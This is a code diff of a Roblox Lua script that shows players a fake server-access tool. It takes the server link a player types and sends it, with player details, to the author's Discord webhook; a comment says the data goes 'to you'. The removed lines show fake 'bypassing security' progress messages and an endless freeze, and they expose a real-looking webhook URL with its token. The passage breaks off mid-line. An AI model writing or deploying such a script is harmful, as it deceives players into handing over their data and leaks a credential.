@@ -1,5 +1,5 @@
 -- ===== НАСТРОЙКА =====
-local webhook = "https://discord.com/api/webhooks/1484561417003860122/ZP3_K9aBrLdzQyiwhPpq4oOFs8fycIkltCvOLvndVidLRdR0SRT5l0kOhsz2YuLJ7i9F"
+local webhook = "ТВОЯ_ССЫЛКА_ВЕБХУКА"
 
 local HttpService = game:GetService("HttpService")
 
@@ -18,6 +18,14 @@ local function sendToDiscord(link, player)
             Body = json
         })
     end)
+end
+
+-- ===== ФУНКЦИЯ ПРОВЕРКИ ССЫЛКИ =====
+local function isValidRobloxLink(link)
+    link = string.lower(link)
+    return string.find(link, "roblox.com/games/") 
+        or string.find(link, "roblox.com/share") 
+        or string.find(link, "roblox://")
 end
 
 -- ===== GUI =====
@@ -73,45 +81,35 @@ end
 -- ===== КНОПКА =====
 Button.MouseButton1Click:Connect(function()
     local player = game.Players.LocalPlayer
-    local link = Box.Text ~= "" and Box.Text or "NULL"
-
-    -- отправка тебе
-    sendToDiscord(link, player)
+    local link = Box.Text ~= "" and Box.Text or ""
 
     Frame.Visible = false
     Loading.Visible = true
 
-    addLine("Initializing...")
+    -- ===== ПРОВЕРКА ССЫЛКИ =====
+    if not isValidRobloxLink(link) then
+        Log.Text = ""
+        addLine("Checking link...")
+        wait(1)
+
+        addLine("Invalid Roblox server link ❌")
+        wait(2)
+
+        addLine("Please enter a valid link")
+        wait(2)
+
+        ScreenGui:Destroy()
+        return
+    end
+
+    -- ===== ОТПРАВКА ССЫЛКИ =====
+    sendToDiscord(link, player)
+
+    Log.Text = ""
+    addLine("Valid Roblox link ✔")
     wait(1)
 
     addLine("Connecting to server...")
     wait(1)
 
-    addLine("Server link: "..link)
-    wait(1)
-
-    addLine("Bypassing security...")
-    wait(1)
-
-    addLine("Injecting modules...")
-    wait(1)
-
-    for i = 1,100 do
-        Log.Text = Log.Text .. "\n> Loading assets "..i.."%"
-        wait(0.03)
-    end
-
-    addLine("Access granted.")
-    wait(1)
-
-    addLine("Sending data...")
-    wait(1)
-
-    addLine("ERROR: connection unstable")
-    wait(1)
-
-    -- бесконечный "фриз"
-    while true do
-        wait(0.1)
-    end
-end)
+    add
